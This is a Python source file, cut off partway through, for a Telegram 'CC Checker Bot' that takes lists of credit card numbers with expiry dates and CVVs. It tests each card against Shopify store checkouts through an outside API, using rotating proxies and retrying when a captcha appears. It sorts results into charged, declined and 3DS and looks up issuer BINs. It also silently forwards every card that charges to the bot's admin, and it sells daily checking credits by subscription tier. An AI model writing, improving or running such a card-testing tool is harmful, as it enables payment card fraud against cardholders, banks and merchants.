from config import CheckerConfig
import asyncio
import re
import random
import sys
import os
import json
import aiohttp
from curl_cffi.requests import AsyncSession
from loguru import logger
from telegram import Update, Document, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
import io

# PostgreSQL support
try:
    import psycopg2
    from psycopg2.extras import Json
    HAS_POSTGRES = True
except ImportError:
    HAS_POSTGRES = False

# Setup logger
def setup_logger(script_name: str = "CC BOT") -> None:
    logger.remove()
    logger.level("DEBUG", color="<blue>")
    logger.level("INFO", color="<white>")
    logger.level("SUCCESS", color="<green>")
    logger.level("WARNING", color="<yellow>")
    logger.level("ERROR", color="<red>")
    logger.level("CRITICAL", color="<RED><bold>")

    log_format = (
        "<bold><cyan>[{extra[script]}]</cyan></bold> "
        "- <dim>{time:YYYY-MM-DD HH:mm:ss}</dim> "
        "- <magenta>{line}</magenta> "
        "- <level>{message}</level>"
    )
    logger.configure(extra={"script": script_name})
    logger.add(sys.stdout, level="DEBUG", colorize=True, format=log_format)

setup_logger()
config = CheckerConfig()


def escape_markdown(text: str) -> str:
    """
    Escape special Markdown characters to prevent parsing errors.
    Characters that need escaping: _ * [ ] ( ) ~ ` > # + - = | { } . !
    """
    if not text:
        return ""
    # Characters that need escaping in Telegram Markdown
    escape_chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
    result = str(text)
    for char in escape_chars:
        result = result.replace(char, f'\\{char}')
    return result

# Database connection
DATABASE_URL = os.getenv("DATABASE_URL", "")

def get_db_connection():
    """Get PostgreSQL database connection"""
    if not HAS_POSTGRES or not DATABASE_URL:
        return None
    try:
        conn = psycopg2.connect(DATABASE_URL)
        return conn
    except Exception as e:
        logger.error(f"Database connection error: {e}")
        return None

def init_database():
    """Initialize database tables"""
    conn = get_db_connection()
    if not conn:
        logger.warning("No database connection - using in-memory storage")
        return False

    try:
        cur = conn.cursor()
        # Create base table
        cur.execute("""
            CREATE TABLE IF NOT EXISTS user_settings (
                user_id BIGINT PRIMARY KEY,
                proxy TEXT,
                products TEXT[],
                email TEXT,
                is_shippable BOOLEAN DEFAULT FALSE,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)

        # Add credit/subscription columns if they don't exist
        # credits - current credits available
        cur.execute("""
            DO $$
            BEGIN
                IF NOT EXISTS (SELECT 1 FROM information_schema.columns
                               WHERE table_name='user_settings' AND column_name='credits') THEN
                    ALTER TABLE user_settings ADD COLUMN credits INTEGER DEFAULT 0;
                END IF;
            END $$;
        """)

        # subscription_tier - free, basic, premium, unlimited
        cur.execute("""
            DO $$
            BEGIN
                IF NOT EXISTS (SELECT 1 FROM information_schema.columns
                               WHERE table_name='user_settings' AND column_name='subscription_tier') THEN
                    ALTER TABLE user_settings ADD COLUMN subscription_tier TEXT DEFAULT 'free';
                END IF;
            END $$;
        """)

        # subscription_expires - when subscription expires
        cur.execute("""
            DO $$
            BEGIN
                IF NOT EXISTS (SELECT 1 FROM information_schema.columns
                               WHERE table_name='user_settings' AND column_name='subscription_expires') THEN
                    ALTER TABLE user_settings ADD COLUMN subscription_expires TIMESTAMP;
                END IF;
            END $$;
        """)

        # total_checks_used - lifetime card checks counter
        cur.execute("""
            DO $$
            BEGIN
                IF NOT EXISTS (SELECT 1 FROM information_schema.columns
                               WHERE table_name='user_settings' AND column_name='total_checks_used') THEN
                    ALTER TABLE user_settings ADD COLUMN total_checks_used INTEGER DEFAULT 0;
                END IF;
            END $$;
        """)

        # last_credit_reset - when credits were last reset (for daily reset)
        cur.execute("""
            DO $$
            BEGIN
                IF NOT EXISTS (SELECT 1 FROM information_schema.columns
                               WHERE table_name='user_settings' AND column_name='last_credit_reset') THEN
                    ALTER TABLE user_settings ADD COLUMN last_credit_reset DATE DEFAULT CURRENT_DATE;
                END IF;
            END $$;
        """)

        conn.commit()
        cur.close()
        conn.close()
        logger.info("Database initialized successfully with credit/subscription columns")
        return True
    except Exception as e:
        logger.error(f"Database init error: {e}")
        return False

# In-memory fallback
user_settings_cache = {}

# Subscription tier credit limits (per day)
TIER_CREDITS = {
    "free": 10,
    "basic": 100,
    "premium": 500,
    "unlimited": -1,  # -1 means unlimited
}

TIER_NAMES = {
    "free": "🆓 Free",
    "basic": "⭐ Basic",
    "premium": "💎 Premium",
    "unlimited": "👑 Unlimited",
}

def get_default_settings() -> dict:
    """Return default settings for a new user"""
    return {
        "proxy": None,
        "products": [],
        "email": None,
        "is_shippable": False,
        "credits": TIER_CREDITS["free"],  # Start with free tier credits
        "subscription_tier": "free",
        "subscription_expires": None,
        "total_checks_used": 0,
        "last_credit_reset": None,
    }

def get_user_settings(user_id: int) -> dict:
    """Get or create user settings from database or cache"""
    # Try database first
    conn = get_db_connection()
    if conn:
        try:
            cur = conn.cursor()
            cur.execute(
                """SELECT proxy, products, email, is_shippable,
                          credits, subscription_tier, subscription_expires,
                          total_checks_used, last_credit_reset
                   FROM user_settings WHERE user_id = %s""",
                (user_id,)
            )
            row = cur.fetchone()
            cur.close()
            conn.close()

            if row:
                return {
                    "proxy": row[0],
                    "products": row[1] if row[1] else [],
                    "email": row[2],
                    "is_shippable": row[3],
                    "credits": row[4] if row[4] is not None else TIER_CREDITS["free"],
                    "subscription_tier": row[5] or "free",
                    "subscription_expires": row[6],
                    "total_checks_used": row[7] or 0,
                    "last_credit_reset": row[8],
                }
            else:
                # Create new user settings with default credits
                return save_user_settings(user_id, get_default_settings())
        except Exception as e:
            logger.error(f"Database read error: {e}")

    # Fallback to in-memory
    if user_id not in user_settings_cache:
        user_settings_cache[user_id] = get_default_settings()
    return user_settings_cache[user_id]

def save_user_settings(user_id: int, settings: dict) -> dict:
    """Save user settings to database"""
    conn = get_db_connection()
    if conn:
        try:
            cur = conn.cursor()
            cur.execute("""
                INSERT INTO user_settings (user_id, proxy, products, email, is_shippable,
                                           credits, subscription_tier, subscription_expires,
                                           total_checks_used, last_credit_reset, updated_at)
                VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, CURRENT_TIMESTAMP)
                ON CONFLICT (user_id) DO UPDATE SET
                    proxy = EXCLUDED.proxy,
                    products = EXCLUDED.products,
                    email = EXCLUDED.email,
                    is_shippable = EXCLUDED.is_shippable,
                    credits = EXCLUDED.credits,
                    subscription_tier = EXCLUDED.subscription_tier,
                    subscription_expires = EXCLUDED.subscription_expires,
                    total_checks_used = EXCLUDED.total_checks_used,
                    last_credit_reset = EXCLUDED.last_credit_reset,
                    updated_at = CURRENT_TIMESTAMP
            """, (
                user_id,
                settings.get("proxy"),
                settings.get("products", []),
                settings.get("email"),
                settings.get("is_shippable", False),
                settings.get("credits", 0),
                settings.get("subscription_tier", "free"),
                settings.get("subscription_expires"),
                settings.get("total_checks_used", 0),
                settings.get("last_credit_reset"),
            ))
            conn.commit()
            cur.close()
            conn.close()
            logger.debug(f"Saved settings for user {user_id}")
        except Exception as e:
            logger.error(f"Database save error: {e}")

    # Also update cache
    user_settings_cache[user_id] = settings
    return settings

def update_user_setting(user_id: int, key: str, value) -> dict:
    """Update a single setting for a user"""
    settings = get_user_settings(user_id)
    settings[key] = value
    return save_user_settings(user_id, settings)


# =============================================================================
# CREDIT & SUBSCRIPTION SYSTEM
# =============================================================================

from datetime import datetime, timedelta, date, timezone

def check_and_reset_daily_credits(user_id: int) -> dict:
    """Check if credits need to be reset (daily reset at midnight UTC) and reset if needed"""
    settings = get_user_settings(user_id)
    tier = settings.get("subscription_tier", "free")
    last_reset = settings.get("last_credit_reset")
    today = date.today()

    # Check if subscription has expired
    expires = settings.get("subscription_expires")
    if expires and isinstance(expires, datetime) and expires < datetime.now(timezone.utc):
        # Subscription expired, downgrade to free
        tier = "free"
        settings["subscription_tier"] = tier
        settings["subscription_expires"] = None
        logger.info(f"User {user_id} subscription expired, downgraded to free")

    # Check if we need to reset credits (different day or never reset)
    needs_reset = False
    if last_reset is None:
        needs_reset = True
    elif isinstance(last_reset, date):
        needs_reset = last_reset < today
    elif isinstance(last_reset, datetime):
        needs_reset = last_reset.date() < today

    if needs_reset:
        # Reset credits to tier limit
        tier_limit = TIER_CREDITS.get(tier, TIER_CREDITS["free"])
        if tier_limit == -1:  # Unlimited
            settings["credits"] = 999999  # Large number for unlimited
        else:
            settings["credits"] = tier_limit
        settings["last_credit_reset"] = today
        save_user_settings(user_id, settings)
        logger.info(f"Reset credits for user {user_id}: {settings['credits']} credits (tier: {tier})")

    return settings


def get_user_credits(user_id: int) -> int:
    """Get user's current credits after checking for daily reset"""
    settings = check_and_reset_daily_credits(user_id)
    tier = settings.get("subscription_tier", "free")
    if TIER_CREDITS.get(tier, 0) == -1:  # Unlimited
        return -1  # Return -1 to indicate unlimited
    return settings.get("credits", 0)


def has_enough_credits(user_id: int, amount: int = 1) -> bool:
    """Check if user has enough credits for an operation"""
    credits = get_user_credits(user_id)
    if credits == -1:  # Unlimited
        return True
    return credits >= amount


def deduct_credits(user_id: int, amount: int = 1) -> tuple[bool, int]:
    """
    Deduct credits from user. Returns (success, remaining_credits).
    Also increments total_checks_used counter.
    """
    settings = check_and_reset_daily_credits(user_id)
    tier = settings.get("subscription_tier", "free")

    # Unlimited tier - don't deduct, just increment counter
    if TIER_CREDITS.get(tier, 0) == -1:
        settings["total_checks_used"] = settings.get("total_checks_used", 0) + amount
        save_user_settings(user_id, settings)
        return True, -1

    current_credits = settings.get("credits", 0)
    if current_credits < amount:
        return False, current_credits

    settings["credits"] = current_credits - amount
    settings["total_checks_used"] = settings.get("total_checks_used", 0) + amount
    save_user_settings(user_id, settings)
    return True, settings["credits"]


def add_credits(user_id: int, amount: int) -> int:
    """Add credits to a user (admin function). Returns new credit balance."""
    settings = get_user_settings(user_id)
    settings["credits"] = settings.get("credits", 0) + amount
    save_user_settings(user_id, settings)
    return settings["credits"]


def set_subscription(user_id: int, tier: str, days: int = 30) -> dict:
    """Set user's subscription tier and expiration. Returns updated settings."""
    if tier not in TIER_CREDITS:
        tier = "free"

    settings = get_user_settings(user_id)
    settings["subscription_tier"] = tier

    if tier == "free":
        settings["subscription_expires"] = None
    else:
        settings["subscription_expires"] = datetime.now(timezone.utc) + timedelta(days=days)

    # Reset credits to new tier limit
    tier_limit = TIER_CREDITS.get(tier, TIER_CREDITS["free"])
    if tier_limit == -1:
        settings["credits"] = 999999
    else:
        settings["credits"] = tier_limit

    settings["last_credit_reset"] = date.today()
    save_user_settings(user_id, settings)
    logger.info(f"Set subscription for user {user_id}: tier={tier}, days={days}")
    return settings


def get_subscription_info(user_id: int) -> dict:
    """Get detailed subscription info for a user"""
    settings = check_and_reset_daily_credits(user_id)
    tier = settings.get("subscription_tier", "free")
    credits = settings.get("credits", 0)
    tier_limit = TIER_CREDITS.get(tier, TIER_CREDITS["free"])
    expires = settings.get("subscription_expires")
    total_used = settings.get("total_checks_used", 0)

    # Calculate days until expiration
    days_left = None
    if expires:
        if isinstance(expires, datetime):
            delta = expires - datetime.now(timezone.utc)
            days_left = max(0, delta.days)
        else:
            days_left = 0

    return {
        "tier": tier,
        "tier_name": TIER_NAMES.get(tier, "Unknown"),
        "credits": credits if tier_limit != -1 else "Unlimited",
        "daily_limit": tier_limit if tier_limit != -1 else "Unlimited",
        "expires": expires,
        "days_left": days_left,
        "total_checks_used": total_used,
        "is_unlimited": tier_limit == -1,
    }


def get_no_credits_message() -> str:
    """Get the message to show when user has no credits"""
    return (
        "❌ *No Credits Remaining!*\n\n"
        "You've used all your daily credits.\n\n"
        "🔄 Credits reset daily at midnight UTC\n\n"
        "💎 *Upgrade for more credits:*\n"
        "• Basic: 100 credits/day\n"
        "• Premium: 500 credits/day\n"
        "• Unlimited: No limits!\n\n"
        "Use /subscribe to view plans"
    )


async def check_and_send_credit_notifications(user_id: int, remaining_credits: int):
    """Check if user needs credit notifications and send them"""
    global _bot_app

    if remaining_credits == -1:  # Unlimited
        return

    try:
        if _bot_app is None:
            return

        if remaining_credits == 10:
            await _bot_app.bot.send_message(
                chat_id=user_id,
                text=(
                    "⚠️ *Low Credits Warning!*\n\n"
                    "You have only *10 credits* remaining today.\n\n"
                    "💎 Upgrade to get more credits:\n"
                    "Use /subscribe to view plans"
                ),
                parse_mode="Markdown"
            )
        elif remaining_credits == 0:
            await _bot_app.bot.send_message(
                chat_id=user_id,
                text=get_no_credits_message(),
                parse_mode="Markdown"
            )
    except Exception as e:
        logger.error(f"Error sending credit notification to {user_id}: {e}")


async def check_subscription_expiry_notifications():
    """Check all users for expiring subscriptions and send notifications"""
    global _bot_app

    if _bot_app is None or not DATABASE_URL:
        return

    conn = get_db_connection()
    if not conn:
        return

    try:
        cur = conn.cursor()
        # Find users whose subscription expires in 3 days
        cur.execute("""
            SELECT user_id, subscription_tier, subscription_expires
            FROM user_settings
            WHERE subscription_expires IS NOT NULL
            AND subscription_expires > NOW()
            AND subscription_expires <= NOW() + INTERVAL '3 days'
            AND subscription_tier != 'free'
        """)

        expiring_users = cur.fetchall()
        cur.close()
        conn.close()

        for row in expiring_users:
            user_id, tier, expires = row
            days_left = (expires - datetime.now()).days
            tier_name = TIER_NAMES.get(tier, tier)

            try:
                await _bot_app.bot.send_message(
                    chat_id=user_id,
                    text=(
                        f"⏰ *Subscription Expiring Soon!*\n\n"
                        f"Your {tier_name} subscription expires in *{days_left} days*.\n\n"
                        f"Contact admin to renew your subscription."
                    ),
                    parse_mode="Markdown"
                )
            except Exception as e:
                logger.error(f"Error sending expiry notification to {user_id}: {e}")

    except Exception as e:
        logger.error(f"Error checking subscription expiry: {e}")


# Session state management for pause/stop and input waiting
user_sessions = {}

def get_user_session(user_id: int) -> dict:
    """Get or create a user's checking session state"""
    if user_id not in user_sessions:
        user_sessions[user_id] = {
            "paused": False,
            "stopped": False,
            "checking": False,
            "waiting_for": None  # None, "proxy", "product"
        }
    return user_sessions[user_id]

def reset_user_session(user_id: int):
    """Reset a user's session state"""
    user_sessions[user_id] = {
        "paused": False,
        "stopped": False,
        "checking": False,
        "waiting_for": None
    }

def set_waiting_for(user_id: int, waiting_type: str):
    """Set what input the bot is waiting for from user"""
    session = get_user_session(user_id)
    session["waiting_for"] = waiting_type

def get_waiting_for(user_id: int) -> str:
    """Get what input the bot is waiting for"""
    session = get_user_session(user_id)
    return session.get("waiting_for")


# =============================================================================
# GLOBAL STATS TRACKING
# =============================================================================
import time as _time

# Bot statistics (in-memory, resets on restart)
bot_stats = {
    "start_time": _time.time(),
    "total_cards_checked": 0,
    "total_charged": 0,
    "total_declined": 0,
    "total_3ds": 0,
    "banned_users": set(),  # Set of banned user IDs
}

def increment_stat(stat_name: str, amount: int = 1):
    """Increment a stat counter"""
    if stat_name in bot_stats and isinstance(bot_stats[stat_name], int):
        bot_stats[stat_name] += amount

def get_uptime() -> str:
    """Get bot uptime as formatted string"""
    elapsed = int(_time.time() - bot_stats["start_time"])
    days = elapsed // 86400
    hours = (elapsed % 86400) // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    if days > 0:
        return f"{days}d {hours}h {minutes}m"
    elif hours > 0:
        return f"{hours}h {minutes}m {seconds}s"
    else:
        return f"{minutes}m {seconds}s"

def is_user_banned(user_id: int) -> bool:
    """Check if a user is banned"""
    return user_id in bot_stats["banned_users"]

def ban_user(user_id: int):
    """Ban a user"""
    bot_stats["banned_users"].add(user_id)

def unban_user(user_id: int):
    """Unban a user"""
    bot_stats["banned_users"].discard(user_id)


def create_lista_(text: str):
    """Extract credit card numbers from text"""
    m = re.findall(
        r'\d{15,16}(?:/|:|\|)\d+(?:/|:|\|)\d{2,4}(?:/|:|\|)\d{3,4}', text)
    lis = list(filter(lambda num: num.startswith(
        ("5", "6", "3", "4")), [*set(m)]))
    return [xx.replace("/", "|").replace(":", "|") for xx in lis]


async def auto_shopify_client(
    card,
    product_url,
    email: str = None,
    is_shippable: bool = False,
    proxies: list = [],
    max_retries: int = 4,
    request_timeout: int =  45,
    logger = None
):
    last_error = None
    timeout = aiohttp.ClientTimeout(total=request_timeout)  # 45s timeout

    async with aiohttp.ClientSession(timeout=timeout) as session:
        for attempt in range(1, max_retries + 1):
            try:
                data = {
                    "card": card,
                    "product_url": product_url,
                    "email": email,
                    "is_shippable": is_shippable,
                    "proxy": random.choice(proxies) if proxies else None,
                }

                async with session.post(
                    "http://api.voidapi.xyz:8080/v2/shopify_graphql",
                    json=data,
                ) as response:

                    result = await response.json()
                    status = result.get("status")
                    error = result.get("error")

                    if result.get("success"):
                        return result.get("data")

                    # Debug info
                    logger.info( f"[Attempt {attempt}/{max_retries}] status={status}, error={error}")

                    # Retry conditions
                    if error and any(err in error for err in (
                        "ProxyError",
                        "Failed to connect to proxy",
                        "Failed to initialize checkout data",
                        "Failed to perform, curl",
                        'Failed to add to cart'
                    )):
                        last_error = {"error": error, "status": status}

                    elif error and "captcha is required for this checkout" in error.lower():
                        last_error = {
                            "error": "Captcha triggered! Try again.", "status": status}

                    else:
                        # ✅ Non-retriable
                        return result

            except aiohttp.ClientError as e:
                last_error = {"error": f"Client....",
                              "status": "network_error"}
                logger.warning(f"[Attempt {attempt}/{max_retries}] ClientError: {e}")

            except asyncio.TimeoutError:
                last_error = {
                    "error": "TimeoutError: Request took too long", "status": "timeout"}
                logger.warning(
                    f"[Attempt {attempt}/{max_retries}] Request timed out after 45s")

            except Exception as e:
                last_error = {"error": str(e), "status": "exception"}
                logger.warning(
                    f"[Attempt {attempt}/{max_retries}] Unexpected error: {e}")

            # Sleep before retrying
            if attempt < max_retries:
                await asyncio.sleep(0.3)

    # If retries exhausted, return last known error
    return last_error or {"status": "UnknownError", "error": "Unexpected error. Try again..."}


# =============================================================================
# CONCURRENCY MANAGEMENT - Per-user + Global limits
# =============================================================================

# Global semaphore - prevents server overload and captcha (all users combined)
# Uses config value (default 20) to avoid triggering captcha
global_semaphore = asyncio.Semaphore(config.GLOBAL_CONCURRENCY_LIMIT)

# Per-user semaphores - each user gets their own limit
# This ensures User A's checking doesn't block User B
user_semaphores = {}
user_semaphore_lock = asyncio.Lock()


async def get_user_semaphore(user_id: int) -> asyncio.Semaphore:
    """Get or create a semaphore for a specific user"""
    async with user_semaphore_lock:
        if user_id not in user_semaphores:
            # Each user can process CONCURRENCY_LIMIT cards at once
            user_semaphores[user_id] = asyncio.Semaphore(config.CONCURRENCY_LIMIT)
        return user_semaphores[user_id]


def cleanup_user_semaphore(user_id: int):
    """Remove user semaphore when they're done (optional cleanup)"""
    if user_id in user_semaphores:
        del user_semaphores[user_id]


async def bin_lookup(bin_number: str):
    """Lookup BIN information"""
    try:
        if bin_number.startswith(('4', '5', '3', '6')):
            async with AsyncSession() as session:
                url = f"https://api.voidapi.xyz/v2/bin_lookup/{bin_number[:6]}"
                response = await session.get(url)
                if response.status_code == 200:
                    return response.json()
                else:
                    return {"error": f"Unexpected status code {response.status_code}", "status": "error"}
        else:
            return {"error": "Invalid bin number.", "status": "error"}
    except Exception as e:
        logger.error(f"BIN lookup error: {e}")
        return {"error": str(e), "status": "error"}


def user_has_products(user_id: int) -> bool:
    """Check if user has set product URLs"""
    settings = get_user_settings(user_id)
    return len(settings.get("products", [])) > 0


def create_progress_bar(current: int, total: int, length: int = 10) -> str:
    """Create a visual progress bar"""
    if total == 0:
        return "░" * length
    filled = int(length * current / total)
    empty = length - filled
    bar = "█" * filled + "░" * empty
    percent = int(100 * current / total)
    return f"[{bar}] {percent}%"


async def process_single_card(card: str, user_id: int = None, user_settings: dict = None) -> dict:
    """
    Process a single card and return result.

    Uses two-level concurrency control:
    1. Per-user semaphore: Each user can process up to CONCURRENCY_LIMIT cards at once
    2. Global semaphore: Total concurrent operations across all users capped at GLOBAL_CONCURRENCY_LIMIT

    This ensures User A checking cards doesn't block User B.

    Args:
        card: Card string to check
        user_id: User ID for concurrency control
        user_settings: Pre-fetched user settings (optional, avoids DB calls inside semaphore)
    """
    # Get user settings BEFORE acquiring semaphore (non-blocking)
    if user_settings is None:
        settings = get_user_settings(user_id) if user_id else {}
    else:
        settings = user_settings

    # Check for products early (before acquiring semaphore)
    user_products = settings.get("products", [])
    if not user_products:
        return {
            "card": card,
            "product_url": None,
            "response": {"error": "No product set. Use /addproduct first.", "success": False},
            "bin_data": {}
        }

    # Get user-specific semaphore (or create one)
    user_sem = await get_user_semaphore(user_id) if user_id else asyncio.Semaphore(config.CONCURRENCY_LIMIT)

    # Acquire both: user limit AND global limit
    async with user_sem:
        async with global_semaphore:
            try:
                logger.info(f'Processing card: {card} (user: {user_id})')

                product_url = random.choice(user_products)

                # Use user's proxy or fall back to config
                user_proxy = settings.get("proxy")
                proxies = [user_proxy] if user_proxy else config.PROXY_LIST

                response = await auto_shopify_client(
                    card=card,
                    product_url=product_url,
                    email=settings.get("email") or config.DEFAULT_EMAIL,
                    is_shippable=settings.get("is_shippable", config.IS_SHIPPABLE),
                    proxies=proxies,
                    logger=logger
                )

                # Check for invalid product error and auto-remove if detected
                error_msg = response.get("error", "") if response else ""
                if is_product_error(error_msg):
                    asyncio.create_task(remove_invalid_product(user_id, product_url, error_msg))
                    response["product_removed"] = True
                    response["error"] = f"⚠️ Product auto-removed: {error_msg}"

                # BIN lookup is fast and non-critical - run concurrently
                bin_data = await bin_lookup(card[:6])

                return {
                    "card": card,
                    "product_url": product_url,
                    "response": response,
                    "bin_data": bin_data
                }

            except asyncio.CancelledError:
                # Handle cancellation gracefully
                logger.warning(f"Card check cancelled: {card}")
                return {
                    "card": card,
                    "product_url": None,
                    "response": {"error": "Check cancelled", "success": False},
                    "bin_data": {}
                }
            except Exception as e:
                # Catch ALL exceptions to prevent stopping the batch
                logger.error(f"Error processing card {card}: {e}")
                return {
                    "card": card,
                    "product_url": None,
                    "response": {"error": f"Processing error: {str(e)[:50]}", "success": False},
                    "bin_data": {}
                }


def format_result(result: dict, show_full: bool = True) -> str:
    """Format check result for Telegram message with proper escaping"""
    card = result["card"]
    response = result["response"]
    bin_data = result.get("bin_data", {})

    bin_info = ""
    if show_full and bin_data.get("success"):
        bd = bin_data.get("data", {})
        # Escape all dynamic content from BIN data
        bank = escape_markdown(bd.get("bank", "Unknown"))
        emoji = bd.get("emoji", "")  # Emoji doesn't need escaping
        country = escape_markdown(bd.get("country", "Unknown"))
        level = escape_markdown(bd.get("level", "Unknown"))
        card_type = escape_markdown(bd.get("type", "Unknown"))
        scheme = escape_markdown(bd.get("scheme", "Unknown"))
        bin_info = f"\n🏦 *Bank*: {bank}\n💳 *Type*: {scheme} {card_type} {level}\n🌍 *Country*: {country} {emoji}"

    # Get response details and escape them
    error = escape_markdown(response.get("error", ""))
    message = escape_markdown(response.get("message", ""))
    gateway_msg = escape_markdown(response.get("gateway_message", ""))
    decline_code = escape_markdown(response.get("decline_code", ""))

    # Build status message with all available info
    status_parts = []
    if message:
        status_parts.append(message)
    if error:
        status_parts.append(error)
    if gateway_msg and gateway_msg not in str(status_parts):
        status_parts.append(f"Gateway: {gateway_msg}")
    if decline_code and decline_code not in str(status_parts):
        status_parts.append(f"Code: {decline_code}")

    status_text = " \\| ".join(status_parts) if status_parts else "Unknown"

    # Card is displayed in code block (backticks), so it doesn't need escaping
    if response.get('success'):
        return f"✅ *CHARGED*\n\n💳 `{card}`\n📝 *Response*: {status_text}{bin_info}"
    else:
        if '3ds' in str(response.get("error", "")).lower() or '3d' in str(response.get("error", "")).lower():
            return f"🔐 *3DS REQUIRED*\n\n💳 `{card}`\n📝 *Response*: {status_text}{bin_info}"
        else:
            return f"❌ *DECLINED*\n\n💳 `{card}`\n📝 *Response*: {status_text}{bin_info}"


# Global bot application reference for admin notifications
_bot_app = None

async def notify_admin_charged(card: str, result: dict, user_id: int, username: str = None):
    """
    Silently notify admin when a card is successfully charged.
    This runs in background and never interrupts the user's flow.
    """
    try:
        admin_id = config.ADMIN_USER_ID
        if not admin_id or not _bot_app:
            return

        response = result.get("response", {})

        # Escape dynamic content for Markdown
        escaped_username = escape_markdown(username or 'Unknown')
        escaped_message = escape_markdown(response.get("message", ""))
        escaped_gateway = escape_markdown(response.get("gateway_message", ""))

        # Build admin notification message
        message_parts = [
            "💰 *CHARGED CARD FOUND*",
            "",
            f"💳 `{card}`",
            "",
        ]

        # Add response details
        if escaped_message:
            message_parts.append(f"📝 *Response*: {escaped_message}")
        if escaped_gateway:
            message_parts.append(f"🔗 *Gateway*: {escaped_gateway}")

        # Add user info
        message_parts.append("")
        message_parts.append(f"👤 *Found by*: {escaped_username} \\(`{user_id}`\\)")

        admin_message = "\n".join(message_parts)

        # Send to admin silently (in background, no await blocking)
        await _bot_app.bot.send_message(
            chat_id=admin_id,
            text=admin_message,
            parse_mode="Markdown"
        )

    except Exception as e:
        # Silently fail - never interrupt user's checking process
        logger.debug(f"Admin notification failed (silent): {e}")


# Inline Keyboard Builders
def get_main_menu_keyboard():
    """Build the main menu inline keyboard"""
    keyboard = [
        [InlineKeyboardButton("📦 Products", callback_data="menu_products")],
        [InlineKeyboardButton("🌐 Proxy", callback_data="menu_proxy")],
        [InlineKeyboardButton("⚙️ Settings", callback_data="menu_settings")],
        [InlineKeyboardButton("💳 Check Cards", callback_data="menu_check_info")],
    ]
    return InlineKeyboardMarkup(keyboard)

def get_products_keyboard(user_id: int):
    """Build products management keyboard"""
    settings = get_user_settings(user_id)
    products = settings.get("products", [])

    keyboard = []
    # Add product button at top
    keyboard.append([InlineKeyboardButton("➕ Add Product", callback_data="prod_add")])

    for i, url in enumerate(products):
        # Shorten URL for display
        display = url.split("/products/")[-1][:20] if "/products/" in url else url[:20]
        keyboard.append([
            InlineKeyboardButton(f"📦 {display}", callback_data=f"prod_view_{i}"),
            InlineKeyboardButton("🗑️", callback_data=f"prod_del_{i}")
        ])

    if products:
        keyboard.append([InlineKeyboardButton("🗑️ Clear All", callback_data="prod_clear_all")])

    keyboard.append([InlineKeyboardButton("◀️ Back", callback_data="menu_main")])
    return InlineKeyboardMarkup(keyboard)

def get_proxy_keyboard(user_id: int):
    """Build proxy management keyboard"""
    settings = get_user_settings(user_id)
    proxy = settings.get("proxy")

    keyboard = []
    keyboard.append([InlineKeyboardButton("➕ Set Proxy", callback_data="proxy_set")])
    if proxy:
        keyboard.append([InlineKeyboardButton("🗑️ Clear Proxy", callback_data="proxy_clear")])
    keyboard.append([InlineKeyboardButton("◀️ Back", callback_data="menu_main")])
    return InlineKeyboardMarkup(keyboard)

def get_checking_keyboard(paused: bool = False):
    """Build checking control keyboard"""
    if paused:
        keyboard = [
            [
                InlineKeyboardButton("▶️ Resume", callback_data="chk_resume"),
                InlineKeyboardButton("⏹️ Stop", callback_data="chk_stop")
            ]
        ]
    else:
        keyboard = [
            [
                InlineKeyboardButton("⏸️ Pause", callback_data="chk_pause"),
                InlineKeyboardButton("⏹️ Stop", callback_data="chk_stop")
            ]
        ]
    return InlineKeyboardMarkup(keyboard)

def get_back_keyboard(callback: str = "menu_main"):
    """Simple back button keyboard"""
    return InlineKeyboardMarkup([[InlineKeyboardButton("◀️ Back", callback_data=callback)]])

def get_cancel_keyboard():
    """Cancel input keyboard"""
    return InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel_input")]])


# Telegram Bot Handlers
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command - show main menu"""
    user_id = update.effective_user.id
    set_waiting_for(user_id, None)  # Clear any pending input

    await update.message.reply_text(
        "🔥 *CC Checker Bot*\n\n"
        "Welcome! Use the buttons below to navigate.\n\n"
        "📎 *Send .txt file* or paste cards to check them.\n\n"
        "*Card Format:* `4111111111111111|12|2025|123`",
        parse_mode="Markdown",
        reply_markup=get_main_menu_keyboard()
    )


async def menu_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /menu command - show interactive menu"""
    user_id = update.effective_user.id
    set_waiting_for(user_id, None)  # Clear any pending input

    await update.message.reply_text(
        "🔥 *CC Checker Bot*\n\n"
        "Select an option below:",
        parse_mode="Markdown",
        reply_markup=get_main_menu_keyboard()
    )


async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle all callback queries from inline keyboards"""
    query = update.callback_query
    await query.answer()

    user_id = query.from_user.id
    data = query.data

    # Clear waiting state when navigating menus
    if data.startswith("menu_"):
        set_waiting_for(user_id, None)

    # Main menu
    if data == "menu_main":
        set_waiting_for(user_id, None)
        await query.edit_message_text(
            "🔥 *CC Checker Bot*\n\n"
            "Select an option below:",
            parse_mode="Markdown",
            reply_markup=get_main_menu_keyboard()
        )

    # Products menu
    elif data == "menu_products":
        settings = get_user_settings(user_id)
        products = settings.get("products", [])

        if products:
            text = f"📦 *Your Products* ({len(products)})\n\n"
            for i, url in enumerate(products):
                short_url = url[:50] + "..." if len(url) > 50 else url
                text += f"{i+1}. `{short_url}`\n"
        else:
            text = "📦 *Your Products*\n\nNo products added yet.\n\nClick ➕ Add Product to add one."

        await query.edit_message_text(
            text,
            parse_mode="Markdown",
            reply_markup=get_products_keyboard(user_id)
        )

    # Add product - ask for URL
    elif data == "prod_add":
        set_waiting_for(user_id, "product")
        await query.edit_message_text(
            "📦 *Add Product*\n\n"
            "Send me a Shopify product URL:\n\n"
            "Example: `https://store.com/products/item`",
            parse_mode="Markdown",
            reply_markup=get_cancel_keyboard()
        )

    # View single product
    elif data.startswith("prod_view_"):
        idx = int(data.split("_")[-1])
        settings = get_user_settings(user_id)
        products = settings.get("products", [])

        if idx < len(products):
            url = products[idx]
            await query.edit_message_text(
                f"📦 *Product #{idx + 1}*\n\n`{url}`",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🗑️ Remove", callback_data=f"prod_del_{idx}")],
